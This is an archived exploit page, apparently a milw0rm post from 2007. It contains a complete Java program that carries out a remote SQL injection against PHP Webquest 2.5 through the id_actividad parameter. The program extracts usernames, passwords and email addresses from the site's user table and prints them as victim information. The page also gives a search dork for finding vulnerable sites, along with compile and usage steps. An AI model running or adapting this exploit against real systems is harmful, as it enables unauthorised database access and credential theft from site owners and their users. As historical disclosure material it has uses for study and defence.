<html><head><title>PHP Webquest <= 2.5 (id_actividad) Remote SQL Injection Exploit</title></head><pre>/*
 * script name        : phpwebquest
 * script version  : 2.5
 * script website  : http://phpwebquest.org
 * Bug Finder      : D4real_TeaM ('unkn0wnX','n3t-mapper','ToxiC350');
 * injected file   : webquest/soporte_derecha_w.php
 * Variable        : id_actividad
 * Contact         : n3t-mapp3r [At] hotmail [dot] com,is14m [At] hotmail [dot] com,ushermehdi350 [At] hotmail [dot] com
 *
 * Usage:
 *         First you must have a JDK 1.4 or more to compile the code
 *         Compiling: javac -nowarn -g:none SqInjection.java
 *         Usage: java SqInjection host_name /path/to/script/
 * Dork : inurl:/webquest/soporte_derecha_w.php?
 *
 * GreetZ : s4udi-s3curity-terror, Spy-Boy, R3mix-boY, Dchach-X, DiaboliC4, j4v4k, Hitch4w4, Und34d and all Moroccan,arab hackerS
 * Sp.Greetz : s0crateX ;)
 */


import java.io.*;
import java.net.* ;
public class SqInjection {

    public static void main(String[] argv) {
        Socket lhlawa;
        String hName,tra9,bachT3tih=&quot; union select 1,1,1,1,concat(usuario,0x3a,password,0x3a,e_mail) from usuario&quot;;
        int lmarsa=80;
        BufferedReader _______dakhl;PrintWriter _______kharj;
        if(argv.length!=2){
            System.out.println(&quot;Error: args not properly defined&quot;);
            System.exit (-1);
        }
        String zgawa[]=argv[0].split(&quot;:&quot;);
        if(zgawa.length==2){
            hName=zgawa[0];
            try{
                lmarsa=Integer.parseInt(zgawa[1]);
            }catch(NumberFormatException ex){
                System.out.println(&quot;Error: Invalid Port&quot;);System.exit(0);
            }
        }else{
            hName=argv[0];
        }
        tra9=argv[1];
        System.out.print(&quot;Connecing to: &quot;+hName);
        try{
            lhlawa=new Socket(hName,lmarsa);
            System.out.println(&quot;\t\t[ OK ]&quot;);
            String in3alBoh=&quot;&quot;,taya7Jdo=&quot;GET /&quot;+tra9+&quot;/webquest/soporte_derecha_w.php?id_actividad=-1&quot;+URLEncoder.encode(bachT3tih)+&quot;/* HTTP/1.1\n&quot;;
            taya7Jdo+=&quot;Host: &quot;+hName+&quot;\n&quot;;
            taya7Jdo+=&quot;Connection: Close\n\n&quot;;
            _______kharj=new PrintWriter(lhlawa.getOutputStream());
            _______dakhl=new BufferedReader(new InputStreamReader( lhlawa.getInputStream()));
            _______kharj.print(taya7Jdo);
            _______kharj.flush();
            String line=_______dakhl.readLine();
            if(line.equalsIgnoreCase(&quot;HTTP/1.1 200 OK&quot;)==false){
                System.out.println(&quot;Error:Invalid HTTP protocol&quot;);System.exit(0);
            }
            boolean ok=false;
            while((line=_______dakhl.readLine())!=null){
                if(ok==false){
                    if(line.length()==0)
                        {ok=true;
                        }
                }
                else in3alBoh+=line+&quot;\n&quot;;   
            }
            _______kharj.close();
            _______dakhl.close();
            parseData(in3alBoh);
        }catch(IOException ex){
            System.out.println(&quot;\nSocket Error program will exit&quot;);
            System.exit(0);
        }
    }
    private static void parseData(String haHwaJay){
        String uName,passwd,mail,tmp[];
        tmp=haHwaJay.split(&quot;\n&quot;);
        for(int i=0;i&lt;tmp.length;i++)
        {
            if(tmp[i].trim().startsWith(&quot;&lt;td width=\&quot;97%\&quot;&gt;&quot;))
            {
                String safiTa7=tmp[i].trim().substring(16,tmp[i].trim().length()-4);
                tmp=safiTa7.split (&quot;:&quot;);
                break;
            }
        }
        uName=tmp[0];passwd=tmp[1];mail=tmp[2];
        System.out.println(&quot;*************************** Informations about the victim ***************************&quot;);
        System.out.println(&quot;User Name: &quot;+uName+&quot;\nPassword: &quot;+passwd+&quot;\nVictimz mail: &quot;+mail);
    }
}

# milw0rm.com [2007-09-14]</pre></html>